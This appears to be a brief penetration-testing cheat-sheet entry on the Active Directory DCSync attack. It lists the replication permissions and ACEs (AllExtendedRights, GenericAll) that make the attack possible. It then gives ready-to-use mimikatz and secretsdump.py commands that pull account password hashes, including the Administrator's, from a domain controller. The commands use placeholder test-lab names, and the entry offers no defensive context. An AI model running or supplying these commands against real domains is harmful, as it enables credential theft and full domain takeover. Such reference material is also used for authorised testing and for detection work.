If a computer, user, group has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All permission on the domain, it can perform DCSync attack.
These two permissions allow a principal to perform a DCSync attack.

These permissions can be granted by having these ACEs:
	- `AllExtendedRights`
	- `GenericAll`

---
### mimikatz
```powershell
lsadump::dcsync /domain:testlab.local /user:Administrator
```

### secretdump.py
```bash
secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'
```



